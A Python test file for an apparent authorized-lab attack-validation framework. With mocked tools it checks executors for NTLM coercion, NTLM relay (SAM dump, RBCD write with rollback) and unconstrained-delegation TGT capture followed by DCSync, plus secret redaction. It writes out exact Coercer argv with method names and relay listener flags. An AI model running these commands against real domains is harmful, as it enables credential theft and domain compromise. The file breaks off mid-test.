"""T1c-2 listener trio: COERCION (coercion.py), NTLM-RELAY (ntlm_relay.py) and
UNCONSTRAINED-DELEG (unconstrained_deleg.py), plus the ProcessManager chassis
(process_manager.py).

Each technique is driven end-to-end with a scripted fake ProcessManager (the
background listener) + a fake CommandRunner (the synchronous coercion trigger /
rollback / DCSync), with ``config.poll_interval_s = 0`` so the bounded poll loop
never actually sleeps. The emitted receipt is asserted to be a well-formed
``adlab.plan003.proof.v1`` with the shape the harness scorer reads as *proved*:
correct schema/technique/class, the ``{host_id}`` scoring identity the facet keys
on, all steps ok, the right terminal kind with a token, and -- critically -- no
captured auth / relayed SAM / TGT / ccache / recovered secret anywhere.

The honest non-proved shapes are asserted too: a listener that never yields (a
bounded timeout) is an incomplete receipt (``inconclusive``), a denied gate stops
before any listener starts, and -- for NTLM-RELAY ldap_rbcd -- a VERIFIED RBCD
flush rollback is required (an unverified rollback leaves the receipt
``rollback_unverified``, never proved).
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from purplesploit.validation.config import ValidationConfig
from purplesploit.validation.findings import map_finding
from purplesploit.validation.executors import get_executor, is_implemented
from purplesploit.validation.executors.base import (
    ExecutorContext, CommandRunner, RunResult, AuthorizedLabProvider,
)
from purplesploit.validation.executors.process_manager import (
    ProcessManager, ProcHandle, SubprocessProcessManager, poll_for_capture,
)
from purplesploit.validation import proof


# ============================================================ fakes / helpers
class _FakePM(ProcessManager):
    """Scripted background process: start -> handle; read -> accumulating output;
    poll -> None (running) then a code; stop -> final output. ``on_start`` lets a
    test drop a loot/ccache artifact the moment the listener 'starts'."""

    def __init__(self, reads=None, poll_codes=None, on_start=None):
        self.reads = list(reads) if reads is not None else [""]
        self.poll_codes = list(poll_codes) if poll_codes is not None else [None]
        self.on_start = on_start
        self.started: list[list[str]] = []
        self.stopped: list[str] = []
        self._ri = 0
        self._pi = 0

    def start(self, argv, *, env=None, cwd=None) -> ProcHandle:
        self.started.append(list(argv))
        if self.on_start:
            self.on_start(list(argv), cwd)
        return ProcHandle(id=f"h{len(self.started)}")

    def read(self, handle) -> str:
        val = self.reads[min(self._ri, len(self.reads) - 1)]
        self._ri += 1
        return val

    def poll(self, handle):
        val = self.poll_codes[min(self._pi, len(self.poll_codes) - 1)]
        self._pi += 1
        return val

    def stop(self, handle) -> str:
        self.stopped.append(handle.id)
        return self.reads[min(self._ri, len(self.reads) - 1)]


class _KeyRunner(CommandRunner):
    """Scripted synchronous runner keyed on tool basename; impacket-rbcd is keyed
    on ``impacket-rbcd:<action>`` so flush and read can script different output."""

    def __init__(self, script=None):
        self.script = script or {}
        self.calls: list[list[str]] = []

    def run(self, argv, *, env=None, timeout=None, cwd=None) -> RunResult:
        self.calls.append(list(argv))
        name = Path(argv[0]).name
        if name == "impacket-rbcd" and "-action" in argv:
            key = f"impacket-rbcd:{argv[argv.index('-action') + 1]}"
            if key in self.script:
                return self.script[key]
        if name == "impacket-secretsdump" and "secretsdump" in self.script:
            return self.script["secretsdump"]
        return self.script.get(name, RunResult(returncode=0, stdout=""))


class _Deny(AuthorizedLabProvider):
    def __init__(self, op):
        super().__init__(True)
        self._op = op

    def authorize(self, op, detail):
        return "denied" if op == self._op else "not_required"


def _ctx(cfg, runner, tmp_path, pm, authorizer=None):
    return ExecutorContext(cfg, runner=runner,
                           authorizer=authorizer or AuthorizedLabProvider(True),
                           output_dir=tmp_path, proc_manager=pm)


def _cfg(host_aliases=None, **kw) -> ValidationConfig:
    base = dict(domain="north.sevenkingdoms.local", dc_ip="10.0.0.11",
                username="jon.snow", password="iknownothing",
                poll_interval_s=0, tool_timeout_s=5,
                host_aliases=host_aliases or {})
    base.update(kw)
    return ValidationConfig(**base)


# ============================================================ ProcessManager chassis
def test_poll_for_capture_returns_on_marker_without_sleeping():
    pm = _FakePM(reads=["... NORTH/DC01$ authenticated ..."])
    slept = []
    out, captured = poll_for_capture(
        pm, ProcHandle("h1"), success=lambda o: "DC01$" in o,
        interval_s=99, timeout_s=99, sleep=lambda s: slept.append(s))
    assert captured is True and "DC01$" in out
    assert slept == []                      # success on first read -> never sleeps


def test_poll_for_capture_times_out_without_sleeping():
    # Listener never yields; timeout_s = 0 -> the deadline is immediately reached.
    pm = _FakePM(reads=[""], poll_codes=[None])
    slept = []
    out, captured = poll_for_capture(
        pm, ProcHandle("h1"), success=lambda o: "never" in o,
        interval_s=99, timeout_s=0, sleep=lambda s: slept.append(s))
    assert captured is False
    assert slept == []                      # bounded timeout -> honest no-capture


def test_poll_for_capture_stops_when_listener_exits():
    # read never matches and the listener process exits (poll -> code) -> no capture.
    pm = _FakePM(reads=[""], poll_codes=[1])
    out, captured = poll_for_capture(
        pm, ProcHandle("h1"), success=lambda o: "x" in o,
        interval_s=0, timeout_s=99)
    assert captured is False


def test_executor_context_defaults_proc_manager():
    # Additive contract: an ExecutorContext built without proc_manager still gets a
    # real one (no regression for the 8 synchronous executors / existing call sites).
    ctx = ExecutorContext(_cfg(), runner=_KeyRunner(), authorizer=AuthorizedLabProvider(True),
                          output_dir=Path("."))
    assert isinstance(ctx.proc_manager, SubprocessProcessManager)


# ============================================================ COERCION
def _coerce_finding(host="dc01.north.sevenkingdoms.local"):
    return map_finding({"finding_id": "AR-c1", "host": host, "category": "coerce",
                        "severity": "high", "rule_id": "promoted-coerce-signal",
                        "line": f"coercion signal on {host}"})


def _coerce_captured_output(sam="dc01$"):
    return f"[*] SMBD-Thread-3: Received connection from 10.0.0.11\n" \
           f"[*] Authenticating against smb://10.0.0.5 as NORTH/{sam.upper()} SUCCEED\n"


def test_coercion_maps_and_defaults(tmp_path):
    f = _coerce_finding()
    assert f.technique == "COERCION" and is_implemented("COERCION")
    cfg = _cfg()
    specs = {s.name: s for s in get_executor("COERCION").param_specs(
        _ctx(cfg, _KeyRunner(), tmp_path, _FakePM()), f)}
    assert specs["victim_dc"].recommended == f.host
    assert specs["listener_host"].recommended == ""          # framework-managed default
    assert specs["method"].recommended == "auto"


def test_coercion_proved_shaped_receipt(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    pm = _FakePM(reads=[_coerce_captured_output("dc01$")])
    runner = _KeyRunner()
    receipt = get_executor("COERCION").run(_ctx(cfg, runner, tmp_path, pm), _coerce_finding())
    assert receipt["schema"] == proof.PROOF_SCHEMA
    assert receipt["technique"] == "COERCION" and receipt["class"] == "coerce"
    assert receipt["target"].get("host_id") == "dc01"        # facet keys on {host_id}
    assert receipt["complete"] is True
    assert receipt["steps"] and all(s["ok"] for s in receipt["steps"])
    assert receipt["mutation"]["applied"] is False           # non-mutating: no rollback
    tf = receipt["terminal_fact"]
    assert tf and tf["kind"] == "authn_success" and tf["ok"] is True and tf["proof_token"]
    # listener was started AND stopped, and the trigger fired.
    assert pm.started and pm.stopped
    assert any(Path(c[0]).name == "coercer" for c in runner.calls)   # lowercase Kali binary


def test_coercion_no_capture_is_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}},
               tool_timeout_s=0)               # bounded poll elapses immediately
    pm = _FakePM(reads=[""], poll_codes=[None])
    receipt = get_executor("COERCION").run(_ctx(cfg, _KeyRunner(), tmp_path, pm), _coerce_finding())
    assert receipt["complete"] is False
    assert receipt["terminal_fact"] is None
    assert "coercion_no_capture" in receipt["errors"]
    assert pm.stopped                           # listener still cleaned up


def test_coercion_gate_denied_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    pm = _FakePM(reads=[_coerce_captured_output()])
    receipt = get_executor("COERCION").run(
        _ctx(cfg, _KeyRunner(), tmp_path, pm, _Deny("coerce")), _coerce_finding())
    assert receipt["gate"]["classifier"] == "denied"
    assert receipt["complete"] is False and receipt["terminal_fact"] is None
    assert pm.started == []                      # listener never started on denial


def test_coercion_no_secret_in_receipt(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}},
               password="S3cr3tPassw0rd!")
    pm = _FakePM(reads=[_coerce_captured_output()])
    receipt = get_executor("COERCION").run(_ctx(cfg, _KeyRunner(), tmp_path, pm), _coerce_finding())
    blob = json.dumps(receipt)
    assert "S3cr3tPassw0rd!" not in blob         # operator password masked in trigger argv


def test_coercion_operator_override_method_and_listener(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    pm = _FakePM(reads=[_coerce_captured_output()])
    runner = _KeyRunner()
    get_executor("COERCION").run(
        _ctx(cfg, runner, tmp_path, pm), _coerce_finding(),
        overrides={"method": "petitpotam", "listener_host": "10.0.0.250"})
    trig = next(c for c in runner.calls if Path(c[0]).name == "coercer")
    assert trig[trig.index("--filter-method-name") + 1] == "EfsRpcOpenFileRaw"
    assert "10.0.0.250" in trig                  # coercion points at the operator listener


# ------------------------------------------------- T6/S3 coercion extras + redact fix
def test_coercion_shadowcoerce_argv():
    from purplesploit.validation.executors.coercion import coercion_trigger_argv, COERCION_METHODS
    assert "shadowcoerce" in COERCION_METHODS
    argv = coercion_trigger_argv("shadowcoerce", "dc01", "10.0.0.250", _cfg())
    assert argv[:2] == ["coercer", "coerce"]
    assert argv[argv.index("--filter-method-name") + 1] == "IsPathShadowCopied"  # MS-FSRVP
    assert "dc01" in argv and "10.0.0.250" in argv


def test_webdav_coercion_is_a_listener_format_through_an_existing_vector():
    # WebDAV coercion is NOT a distinct method: an <host>@80/<path> listener on
    # petitpotam/dfscoerce makes the target's WebClient authenticate over HTTP.
    from purplesploit.validation.executors.coercion import coercion_trigger_argv
    argv = coercion_trigger_argv("dfscoerce", "dc01", "10.0.0.250@80/x", _cfg())
    assert "10.0.0.250@80/x" in argv                # the WebDAV listener rides the real vector


def test_redact_masks_coercer_double_dash_hashes():
    # review HIGH: Coercer's --hashes (double-dash) was NOT masked by redact_argv -> a leak.
    from purplesploit.validation.executors.base import redact_argv
    out = redact_argv(["coercer", "coerce", "--hashes", "aad3b435:deadbeefcafe", "-t", "dc01"])
    assert "aad3b435:deadbeefcafe" not in out and "***" in out


# ============================================================ NTLM-RELAY
def _relay_finding(host="srv02.north.sevenkingdoms.local"):
    return map_finding({"finding_id": "AR-r1", "host": host, "category": "relay",
                        "severity": "high", "rule_id": "promoted-relay-candidate",
                        "line": f"relay candidate on {host}"})


def _write_loot(tmp_path, name="10.0.0.22_samhashes.sam"):
    loot = Path(tmp_path) / "loot"
    loot.mkdir(parents=True, exist_ok=True)
    (loot / name).write_text("Administrator:500:aad3b...:31d6c...:::\n", encoding="utf-8")
    return loot / name


def test_relay_maps_and_defaults(tmp_path):
    f = _relay_finding()
    assert f.technique == "NTLM-RELAY" and is_implemented("NTLM-RELAY")
    cfg = _cfg()
    specs = {s.name: s for s in get_executor("NTLM-RELAY").param_specs(
        _ctx(cfg, _KeyRunner(), tmp_path, _FakePM()), f)}
    assert specs["relay_target"].recommended == f.host
    assert specs["mode"].recommended == "smb_sam"
    assert specs["method"].recommended == "auto"


def test_relay_smb_sam_proved_shaped_receipt(tmp_path):
    cfg = _cfg(host_aliases={"srv02.north.sevenkingdoms.local": {"host_id": "srv02"}})
    _write_loot(tmp_path)                        # the relay dumped SAM -> loot artifact
    pm = _FakePM(reads=["[*] Dumping SAM hashes"])
    receipt = get_executor("NTLM-RELAY").run(_ctx(cfg, _KeyRunner(), tmp_path, pm), _relay_finding())
    assert receipt["technique"] == "NTLM-RELAY" and receipt["class"] == "relay"
    assert receipt["target"].get("host_id") == "srv02"
    assert receipt["complete"] is True
    assert receipt["steps"] and all(s["ok"] for s in receipt["steps"])
    assert receipt["mutation"]["applied"] is False           # smb_sam is read-only
    tf = receipt["terminal_fact"]
    assert tf and tf["kind"] == "replication_dump" and tf["ok"] is True and tf["proof_token"]


def test_relay_smb_sam_no_loot_is_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"srv02.north.sevenkingdoms.local": {"host_id": "srv02"}},
               tool_timeout_s=0)
    pm = _FakePM(reads=[""], poll_codes=[None])  # no loot file ever appears
    receipt = get_executor("NTLM-RELAY").run(_ctx(cfg, _KeyRunner(), tmp_path, pm), _relay_finding())
    assert receipt["complete"] is False
    assert receipt["terminal_fact"]["classification"] == "no_auth_landed"
    assert receipt["terminal_fact"]["ok"] is False
    assert "no_auth_landed" in receipt["errors"]


def test_relay_ldap_rbcd_proved_with_verified_rollback(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    pm = _FakePM(reads=["[*] Delegation rights modified successfully!"])
    runner = _KeyRunner({
        "impacket-rbcd:flush": RunResult(0, stdout="[*] Delegation rights flushed successfully"),
        "impacket-rbcd:read": RunResult(
            0, stdout="[*] Accounts allowed to act on behalf of other identity:\n"
                      "[*] Target winterfell has no entries"),
    })
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(cfg, runner, tmp_path, pm), _relay_finding("dc01.north.sevenkingdoms.local"),
        overrides={"mode": "ldap_rbcd"})
    assert receipt["target"].get("host_id") == "dc01"
    assert receipt["complete"] is True
    assert receipt["steps"] and all(s["ok"] for s in receipt["steps"])
    assert receipt["mutation"]["applied"] is True            # RBCD written via relay
    assert receipt["mutation"]["rollback"]["verified"] is True
    assert "rollback_unverified" not in receipt["errors"]
    tf = receipt["terminal_fact"]
    assert tf and tf["kind"] == "rbcd_access" and tf["ok"] is True and tf["proof_token"]
    # The flush + positive read-back both ran.
    actions = [c[c.index("-action") + 1] for c in runner.calls
               if Path(c[0]).name == "impacket-rbcd" and "-action" in c]
    assert actions == ["flush", "read"]


def test_relay_ldap_rbcd_unverified_rollback_is_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    pm = _FakePM(reads=["[*] Delegation rights modified successfully!"])
    # Flush 'ran' but the read-back still shows an entry -> SD NOT confirmed cleared.
    runner = _KeyRunner({
        "impacket-rbcd:flush": RunResult(0, stdout="[*] Delegation rights flushed successfully"),
        "impacket-rbcd:read": RunResult(
            0, stdout="[*] Accounts allowed to act on behalf of other identity:\n"
                      "[*] (0) NORTH\\evil$   (S-1-5-21-...-1104)"),
    })
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(cfg, runner, tmp_path, pm), _relay_finding("dc01.north.sevenkingdoms.local"),
        overrides={"mode": "ldap_rbcd"})
    assert receipt["mutation"]["applied"] is True
    assert receipt["mutation"]["rollback"]["performed"] is True
    assert receipt["mutation"]["rollback"]["verified"] is False
    assert "rollback_unverified" in receipt["errors"]


def test_relay_gate_denied_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"srv02.north.sevenkingdoms.local": {"host_id": "srv02"}})
    pm = _FakePM(reads=["[*] Dumping SAM hashes"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(cfg, _KeyRunner(), tmp_path, pm, _Deny("relay")), _relay_finding())
    assert receipt["gate"]["classifier"] == "denied"
    assert receipt["complete"] is False and receipt["terminal_fact"] is None
    assert pm.started == []


def test_relay_no_secret_in_receipt(tmp_path):
    cfg = _cfg(host_aliases={"srv02.north.sevenkingdoms.local": {"host_id": "srv02"}},
               password="R3layP@ss!")
    loot = _write_loot(tmp_path)
    loot.write_text("Administrator:500:aad3b435b51404eeaad3b435b51404ee:CAFED00Dsecrethash:::\n",
                    encoding="utf-8")
    pm = _FakePM(reads=["[*] Dumping SAM hashes"])
    receipt = get_executor("NTLM-RELAY").run(_ctx(cfg, _KeyRunner(), tmp_path, pm), _relay_finding())
    blob = json.dumps(receipt)
    assert "R3layP@ss!" not in blob               # operator password never stored
    assert "CAFED00Dsecrethash" not in blob       # relayed SAM content never read in


# ============================================================ UNCONSTRAINED-DELEG
def _unconstrained_finding(host="dc01.north.sevenkingdoms.local"):
    return map_finding({"finding_id": "AR-u1", "host": host, "category": "delegation",
                        "severity": "high",
                        "line": f"UNCONSTRAINED DELEGATION on {host}"})


def _write_ccache(tmp_path, sam="dc01$"):
    p = Path(tmp_path) / f"{sam}.ccache"
    p.write_bytes(b"\x05\x04fake-kerberos-ticket-blob")
    return p


_DCSYNC_OK = ("[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n"
              "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KRBTGTsecretnthash0000000000000:::\n")


def test_unconstrained_maps_and_defaults(tmp_path):
    f = _unconstrained_finding()
    assert f.technique == "UNCONSTRAINED-DELEG" and is_implemented("UNCONSTRAINED-DELEG")
    cfg = _cfg()
    specs = {s.name: s for s in get_executor("UNCONSTRAINED-DELEG").param_specs(
        _ctx(cfg, _KeyRunner(), tmp_path, _FakePM()), f)}
    assert specs["victim_dc"].recommended == f.host
    assert specs["unconstrained_host"].recommended == ""     # operator-supplied
    assert specs["method"].recommended == "auto"


def test_unconstrained_proved_shaped_receipt(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    _write_ccache(tmp_path, "dc01$")              # krbrelayx captured the DC TGT
    pm = _FakePM(reads=["[*] Got ticket for DC01$"])
    runner = _KeyRunner({"secretsdump": RunResult(0, stdout=_DCSYNC_OK)})
    receipt = get_executor("UNCONSTRAINED-DELEG").run(
        _ctx(cfg, runner, tmp_path, pm), _unconstrained_finding())
    assert receipt["technique"] == "UNCONSTRAINED-DELEG" and receipt["class"] == "delegation"
    assert receipt["target"].get("host_id") == "dc01"
    assert receipt["complete"] is True
    assert receipt["steps"] and all(s["ok"] for s in receipt["steps"])
    assert receipt["mutation"]["applied"] is False           # DCSync is a read
    tf = receipt["terminal_fact"]
    assert tf and tf["kind"] == "replication_dump" and tf["ok"] is True and tf["proof_token"]
    # secretsdump ran with -k -no-pass (ticket-backed DCSync).
    sd = next(c for c in runner.calls if Path(c[0]).name == "impacket-secretsdump")
    assert "-k" in sd and "-no-pass" in sd


def test_unconstrained_no_tgt_is_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}},
               tool_timeout_s=0)
    pm = _FakePM(reads=[""], poll_codes=[None])  # no ccache ever captured
    runner = _KeyRunner({"secretsdump": RunResult(0, stdout=_DCSYNC_OK)})
    receipt = get_executor("UNCONSTRAINED-DELEG").run(
        _ctx(cfg, runner, tmp_path, pm), _unconstrained_finding())
    assert receipt["complete"] is False and receipt["terminal_fact"] is None
    assert "unconstrained_no_tgt" in receipt["errors"]
    # DCSync must not run without a captured ticket.
    assert not any(Path(c[0]).name == "impacket-secretsdump" for c in runner.calls)


def test_unconstrained_dcsync_fails_is_not_proved(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    _write_ccache(tmp_path, "dc01$")
    pm = _FakePM(reads=["[*] Got ticket for DC01$"])
    runner = _KeyRunner({"secretsdump": RunResult(1, stdout="[-] DCSync failed: access denied")})
    receipt = get_executor("UNCONSTRAINED-DELEG").run(
        _ctx(cfg, runner, tmp_path, pm), _unconstrained_finding())
    assert receipt["complete"] is False and receipt["terminal_fact"] is None
    assert "dcsync_failed" in receipt["errors"]
    assert any(s["name"] == "dcsync" and s["ok"] is False for s in receipt["steps"])


def test_unconstrained_gate_denied_inconclusive(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}})
    _write_ccache(tmp_path, "dc01$")
    pm = _FakePM(reads=["[*] Got ticket for DC01$"])
    receipt = get_executor("UNCONSTRAINED-DELEG").run(
        _ctx(cfg, _KeyRunner(), tmp_path, pm, _Deny("coerce")), _unconstrained_finding())
    assert receipt["gate"]["classifier"] == "denied"
    assert receipt["complete"] is False and receipt["terminal_fact"] is None
    assert pm.started == []


def test_unconstrained_no_secret_in_receipt(tmp_path):
    cfg = _cfg(host_aliases={"dc01.north.sevenkingdoms.local": {"host_id": "dc01"}},
               password="Unc0nstr@ined!")
    _write_ccache(tmp_path, "dc01$")
    pm = _FakePM(reads=["[*] Got ticket for DC01$"])
    runner = _KeyRunner({"secretsdump": RunResult(0, stdout=_DCSYNC_OK)})
    receipt = get_executor("UNCONSTRAINED-DELEG").run(
        _ctx(cfg, runner, tmp_path, pm), _unconstrained_finding())
    blob = json.dumps(receipt)
    assert "Unc0nstr@ined!" not in blob            # operator password never stored
    assert "KRBTGTsecretnthash0000000000000" not in blob   # DCSync krbtgt hash never read in
    assert ".ccache" not in blob                   # captured-ticket path never stored


# ============================================================ Relay R1 regressions
@pytest.mark.parametrize("method,vector", [
    ("petitpotam", "EfsRpcOpenFileRaw"),
    ("printerbug", "RpcRemoteFindFirstPrinterChangeNotification"),
    ("dfscoerce", "NetrDfsRemoveStdRoot"),
    ("shadowcoerce", "IsPathShadowCopied"),
])
@pytest.mark.parametrize("use_hash", [False, True])
def test_coercion_single_vectors_use_coercer(method, vector, use_hash):
    from purplesploit.validation.executors.coercion import coercion_trigger_argv
    from purplesploit.validation.executors.base import redact_argv
    secret = "aad3b435:deadbeef" if use_hash else "P@ssw0rd!"
    cfg = _cfg(nt_hash=secret) if use_hash else _cfg(password=secret)
    flag = "-hashes" if use_hash else "-p"
    argv = coercion_trigger_argv(method, "dc01", "10.0.0.250", cfg)
    assert argv == [
        "coercer", "coerce", "-u", cfg.username, "-d", cfg.domain, flag, secret,
        "--dc-ip", cfg.dc_ip, "-l", "10.0.0.250", "-t", "dc01",
        "--filter-method-name", vector, "--always-continue",
    ]
    assert not any(arg.endswith(".py") for arg in argv)
    assert secret not in redact_argv(argv)


def test_coercion_auto_remains_unfiltered_multiplexer():
    from purplesploit.validation.executors.coercion import coercion_trigger_argv
    argv = coercion_trigger_argv("auto", "dc01", "10.0.0.250", _cfg())
    assert argv[:2] == ["coercer", "coerce"]
    assert not any(arg.startswith("--filter-") for arg in argv)
    assert "--always-continue" in argv
    assert argv[argv.index("--dc-ip") + 1] == _cfg().dc_ip


def _relay_runner(trigger=None):
    return _KeyRunner({
        # Coercer's green ERROR_BAD_NETPATH is not a trigger failure.
        "coercer": trigger if trigger is not None else RunResult(1, stdout="ERROR_BAD_NETPATH"),
        "impacket-rbcd:flush": RunResult(0, stdout="Delegation rights flushed successfully"),
        "impacket-rbcd:read": RunResult(
            0, stdout="Accounts allowed to act on behalf of other identity: has no entries"),
    })


def _assert_relay_outcome(receipt, classification):
    succeeded = classification == "action_succeeded"
    assert receipt["terminal_fact"]["classification"] == classification
    assert receipt["terminal_fact"]["ok"] is succeeded
    assert receipt["complete"] is succeeded
    assert receipt["terminal_fact"]["proof_token"]
    assert receipt["terminal_fact"]["mode_proven"] is False
    assert receipt["errors"] == ([] if succeeded else [classification])


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
@pytest.mark.parametrize("trigger", [
    RunResult(None, timed_out=True, error="timeout"),
    RunResult(None, error="missing tool"),
])
def test_relay_classifies_coerce_not_fired(tmp_path, mode, trigger):
    pm = _FakePM(reads=["[*] Servers started, waiting for connections"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(trigger), tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    _assert_relay_outcome(receipt, "coerce_not_fired")
    assert next(s for s in receipt["steps"] if s["name"] == "coerce_trigger")["ok"] is False
    assert pm.stopped == ["h1"]


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
def test_relay_classifies_no_auth_landed(tmp_path, mode):
    pm = _FakePM(reads=["[*] Servers started, waiting for connections"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    _assert_relay_outcome(receipt, "no_auth_landed")
    assert next(s for s in receipt["steps"] if s["name"] == "coerce_trigger")["ok"] is True
    assert receipt["mutation"]["applied"] is False


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
@pytest.mark.parametrize("marker", [
    "Authenticating against {protocol}://srv02 as NORTH/DC01$ SUCCEED",
    "authenticating AGAINST {protocol}://srv02 as NORTH/DC01$ SUCCEED",
    "SMBD-Thread-3: Connection from 10.0.0.11",
])
def test_relay_classifies_action_denied(tmp_path, mode, marker):
    protocol = "ldap" if mode == "ldap_rbcd" else "smb"
    pm = _FakePM(reads=[marker.format(protocol=protocol) + "\nAccess denied"])
    runner = _relay_runner()
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), runner, tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    _assert_relay_outcome(receipt, "action_denied")
    assert receipt["mutation"]["applied"] is False
    assert [c[0] for c in runner.calls] == ["coercer"]  # no write -> no rollback


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
def test_relay_classifies_action_succeeded(tmp_path, mode):
    def loot_on_start(argv, cwd):
        if mode == "smb_sam":
            _write_loot(cwd)
    pm = _FakePM(reads=["Delegation rights modified successfully!" if mode == "ldap_rbcd"
                       else "Dumping SAM hashes"], on_start=loot_on_start)
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    _assert_relay_outcome(receipt, "action_succeeded")
    assert receipt["terminal_fact"]["kind"] == (
        "rbcd_access" if mode == "ldap_rbcd" else "replication_dump")
    assert receipt["mutation"]["applied"] is (mode == "ldap_rbcd")
    assert receipt["mutation"]["rollback"]["verified"] is (mode == "ldap_rbcd")


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
def test_relay_partial_signal_timeout_is_inconclusive(tmp_path, mode):
    pm = _FakePM(reads=["SMBD-Thread-3: Authenticating"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    _assert_relay_outcome(receipt, "inconclusive")


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
def test_relay_listener_only_serves_smb(tmp_path, mode):
    pm = _FakePM()
    get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    argv, = pm.started
    assert {"--no-http-server", "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
            "--no-winrm-server", "--no-mssql-server", "--no-rdp-server"} <= set(argv)
    assert "--no-smb-server" not in argv
    assert argv[argv.index("-t") + 1].startswith("ldap://" if mode == "ldap_rbcd" else "smb://")


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
@pytest.mark.parametrize("classification", [
    "coerce_not_fired", "no_auth_landed", "action_denied", "action_succeeded", "inconclusive",
])
def test_relay_secret_payload_never_enters_receipt_or_token(tmp_path, mode, classification):
    tokens = []
    for index, payload in enumerate([
        "aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef P@ssw0rd!",
        "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb:cafebabecafebabecafebabecafebabe DifferentPassword!",
    ]):
        out_dir = tmp_path / str(index)
        marker = {
            "coerce_not_fired": "",
            "no_auth_landed": "[*] Servers started",
            "action_denied": "Authenticating against ldap://srv02 as NORTH/DC01$ SUCCEED",
            "action_succeeded": "Delegation rights modified successfully!",
            "inconclusive": "SMBD-Thread-3: Authenticating",
        }[classification]
        if classification == "action_succeeded" and mode == "smb_sam":
            _write_loot(out_dir).write_text(payload, encoding="utf-8")
        trigger = RunResult(None, stdout=payload, stderr=payload, timed_out=True, error=payload) \
            if classification == "coerce_not_fired" else RunResult(1, stdout=payload, stderr=payload)
        runner = _relay_runner(trigger)
        runner.script["impacket-rbcd:flush"].stdout += "\n" + payload
        runner.script["impacket-rbcd:read"].stdout += "\n" + payload
        pm = _FakePM(reads=[marker + "\n" + payload])
        receipt = get_executor("NTLM-RELAY").run(
            _ctx(_cfg(tool_timeout_s=0, password="P@ssw0rd!"), runner, out_dir, pm),
            _relay_finding(), overrides={"mode": mode})
        _assert_relay_outcome(receipt, classification)
        blob = json.dumps(receipt)
        for secret in payload.replace(":", " ").split() + ["P@ssw0rd!"]:
            assert secret not in blob
        tokens.append(receipt["terminal_fact"]["proof_token"])
    assert tokens[0] == tokens[1]


@pytest.mark.parametrize("proven_mode", ["smb_sam", "ldap_rbcd"])
def test_relay_mode_proven_is_independent_of_class_flag(tmp_path, monkeypatch, proven_mode):
    from purplesploit.validation.executors.ntlm_relay import MODE_PROVEN
    executor = get_executor("NTLM-RELAY")
    monkeypatch.setattr(executor, "verified_recipe", True)
    monkeypatch.setitem(MODE_PROVEN, proven_mode, True)
    for mode in ("smb_sam", "ldap_rbcd"):
        receipt = executor.run(
            _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path / mode, _FakePM()),
            _relay_finding(), overrides={"mode": mode})
        assert receipt["terminal_fact"]["mode_proven"] is (mode == proven_mode)


@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
def test_relay_classifies_session_from_final_listener_output(tmp_path, mode):
    # The poll sees no signal; stop drains the session marker before classification.
    pm = _FakePM(reads=["", "Authenticating against smb://srv02 as NORTH/DC01$ SUCCEED"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
        _relay_finding(), overrides={"mode": mode})
    _assert_relay_outcome(receipt, "action_denied")


def test_relay_rbcd_success_from_final_listener_output(tmp_path):
    pm = _FakePM(reads=["", "Delegation rights modified successfully!"])
    receipt = get_executor("NTLM-RELAY").run(
        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
